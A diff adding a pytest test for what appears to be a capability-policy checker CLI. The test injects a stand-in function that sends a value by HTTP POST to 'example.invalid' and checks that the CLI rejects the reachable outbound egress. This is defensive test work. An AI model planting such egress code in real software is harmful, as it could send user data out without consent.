@@ -110,6 +110,26 @@ def _write_json(path: Path, value: Any) -> None:
     )
 
 
+def test_check_repository_cli_rejects_reachable_atomic_http_egress(
+    repository: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = repository / "src/unrest_harness/capability_policy.py"
+    path.write_text(
+        path.read_text(encoding="utf-8")
+        + """
+
+def _atomic_http_egress(value):
+    import httpx
+    return httpx.post("https://example.invalid", content=value)
+""",
+        encoding="utf-8",
+    )
+    result = _run_cli(repository, monkeypatch)
+    assert result.exit_code != 0
+    assert "reachable-capability-closure:" in result.output
+
+
 def test_repository_command_strictly_validates_each_capability_asset_content(
     repository: Path,
     monkeypatch: pytest.MonkeyPatch,
